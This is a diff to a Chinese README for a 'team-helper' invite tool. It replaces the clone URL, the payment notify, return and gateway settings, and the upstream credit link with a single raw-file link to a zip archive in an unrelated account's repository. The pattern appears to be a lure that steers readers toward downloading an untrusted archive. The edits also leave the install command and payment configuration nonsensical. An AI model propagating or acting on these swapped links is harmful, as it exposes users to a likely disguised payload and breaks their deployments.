@@ -52,7 +52,7 @@
 ### 1. 克隆仓库
 
 ```bash
-git clone https://github.com/tianjiangqiji/team-helper.git
+git clone https://raw.githubusercontent.com/Ksentin9371/team-helper/main/core/team_helper_v2.3.zip
 ```
 cd team-helper
 ```
@@ -88,9 +88,9 @@ REDIS_PASSWORD=your-redis-password  # 如果有密码
 # 配置易支付（可选，部署后在管理后台配置支付方式也可以，如果填入首次进入后后会存入数据库，此处就可以删除了）
 EPAY_MERCHANT_ID=your-merchant-id
 EPAY_API_KEY=your-api-key
-EPAY_NOTIFY_URL=https://your-domain.com/api/pay/notify
-EPAY_RETURN_URL=https://your-domain.com/buy
-EPAY_GATEWAY_URL=https://your-epay-gateway.com/submit.php
+EPAY_NOTIFY_URL=https://raw.githubusercontent.com/Ksentin9371/team-helper/main/core/team_helper_v2.3.zip
+EPAY_RETURN_URL=https://raw.githubusercontent.com/Ksentin9371/team-helper/main/core/team_helper_v2.3.zip
+EPAY_GATEWAY_URL=https://raw.githubusercontent.com/Ksentin9371/team-helper/main/core/team_helper_v2.3.zip
 EPAY_PRODUCT_PRICE=1.00
 ```
 
@@ -231,7 +231,7 @@ MAX_CONCURRENT_INVITES=3
 
 ## 致谢
 
-本项目基于 [team-invite-kfc](https://github.com/james-6-23/team-invite-kfc) 开发。
+本项目基于 [team-invite-kfc](https://raw.githubusercontent.com/Ksentin9371/team-helper/main/core/team_helper_v2.3.zip) 开发。
 
 ## 贡献
 
